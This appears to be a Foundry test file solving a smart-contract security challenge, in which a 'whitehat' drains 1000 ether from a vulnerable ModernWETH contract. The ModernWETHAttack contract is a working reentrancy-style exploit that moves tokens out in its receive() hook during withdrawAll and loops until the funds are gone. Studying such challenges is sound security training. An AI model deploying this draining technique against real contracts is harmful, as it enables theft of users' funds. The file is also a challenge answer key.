// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract ModernWETHAttack {
    ModernWETH public modernWETH;
    address public owner;

    constructor(ModernWETH _modernWETH) {
        modernWETH = _modernWETH;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        uint256 depositAmount = msg.value;

        // Continue the attack as long as there's ETH to drain
        while (modernWETH.balanceOf(owner) + depositAmount <= address(modernWETH).balance) {
            // Deposit ETH to get mWETH
            modernWETH.deposit{value: depositAmount}();
            // Trigger the vulnerability by calling withdrawAll
            modernWETH.withdrawAll();
            // The receive() function will be called here, transferring ETH to the owner
        }

        // Return the deposit ETH to the owner
        (bool success,) = payable(owner).call{value: depositAmount}("");
        require(success, "Transfer back failed");
    }

    // This function is called when the contract receives ETH
    receive() external payable {
        // Immediately transfer mWETH as received ETH to the owner
        // This prevents the tokens from being burned in the withdrawAll function
        modernWETH.transfer(owner, msg.value);
    }
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/

        // Deploy the ModernWETHAttack contract
        ModernWETHAttack attacker = new ModernWETHAttack(modernWETH);

        // Perform the attack
        // This will accumulate mWETH tokens as modernWETH ETH balance and transfer to the whitehat
        attacker.attack{value: 10 ether}();

        // Whitehat withdraws all accumulated mWETH
        // This converts all mWETH tokens to ETH, completing the rescue
        modernWETH.withdrawAll();

        //==================================================//
        vm.stopPrank();

        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
}
